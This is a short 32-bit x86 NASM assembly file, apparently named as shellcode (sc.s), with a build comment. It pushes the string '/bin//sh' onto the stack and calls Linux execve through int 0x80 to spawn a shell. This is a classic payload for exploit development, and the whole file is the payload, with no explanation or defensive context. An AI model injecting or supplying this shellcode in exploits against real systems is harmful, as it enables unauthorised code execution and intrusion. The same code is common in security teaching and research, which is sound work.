; nasm -f bin -o sc.o sc.s

BITS 32

global _start
_start:
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    xor ecx, ecx
    push 0xb
    pop eax
    cdq 
    int 0x80
